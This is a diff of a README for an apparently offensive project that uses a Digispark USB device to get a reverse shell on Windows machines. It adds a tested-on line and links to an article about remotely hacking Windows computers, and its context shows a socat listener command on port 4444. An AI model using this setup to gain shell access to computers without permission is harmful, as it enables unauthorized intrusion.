@@ -1,6 +1,8 @@
 # Reverse-Shell-Using-Digispark
 
-##Please use for ethical purposes only
+## Please use for ethical purposes only
+
+### Tested on Windows 10 and 11
 
 1) On your kali machine, start a socat listener on port 4444 using the following command:
    ``` socat TCP-L:4444 - ```
@@ -17,6 +19,7 @@
 And you should have your reverse shell.
 
 For more details, you can read this article I wrote :
+https://medium.com/@asadparkar/hack-any-windows-computer-using-a-usb-gain-remote-shell-access-over-the-internet-4112aa484b94
 
 or watch my video
 https://www.youtube.com/watch?v=4Kw-RFkrIX8&t=4s
